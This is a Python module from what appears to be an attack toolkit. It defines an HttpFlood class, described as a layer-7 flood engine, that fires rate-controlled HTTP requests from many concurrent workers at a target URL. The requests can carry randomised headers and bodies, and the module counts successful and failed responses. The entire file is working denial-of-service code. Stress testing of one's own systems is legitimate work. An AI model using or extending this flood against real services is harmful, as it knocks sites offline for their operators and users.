from __future__ import annotations

import asyncio
import random

import aiohttp

from ..config import Config, HttpPayload
from .base import AttackEngine


class HttpFlood(AttackEngine):
    """L7 flood: N concurrent keep-alive connections firing requests at a target rate."""

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg.effective_rps(), cfg.workers, cfg.duration_sec)
        payload = cfg.http or HttpPayload()
        path = payload.path or "/"
        if not path.startswith(("/", "?")):
            path = "/" + path
        self.url = cfg.target.rstrip("/") + path
        self.method = payload.method
        self.headers = dict(payload.headers)
        self.headers_random = payload.headers_random
        self.body_template = payload.body_template
        self.body = payload.body.encode() if payload.body else None

    async def run(self) -> None:
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        connector = aiohttp.TCPConnector(limit=self.workers, ttl_dns_cache=300)
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=self.headers or None
        ) as session:

            async def worker() -> None:
                while not self.stop_event.is_set():
                    await self.bucket.acquire()
                    headers = {
                        key: random.choice(values)
                        for key, values in self.headers_random.items()
                        if values
                    }
                    body = self.body
                    if self.body_template is not None:
                        body = self.body_template.replace("{rand_int}", str(random.randint(0, 2**31 - 1))).encode()
                    try:
                        async with session.request(self.method, self.url, data=body, headers=headers or None) as resp:
                            await resp.read()
                            if 200 <= resp.status < 400:
                                self.stats["ok"] += 1
                            else:
                                self.stats["err"] += 1
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        self.stats["err"] += 1
                    finally:
                        self.stats["sent"] += 1

            workers = [asyncio.create_task(worker()) for _ in range(self.workers)]
            try:
                await asyncio.wait_for(self.stop_event.wait(), timeout=self.duration_sec)
            except asyncio.TimeoutError:
                pass
            for w in workers:
                w.cancel()
            # Let in-flight requests drain; ignore their CancelledError.
            await asyncio.gather(*workers, return_exceptions=True)
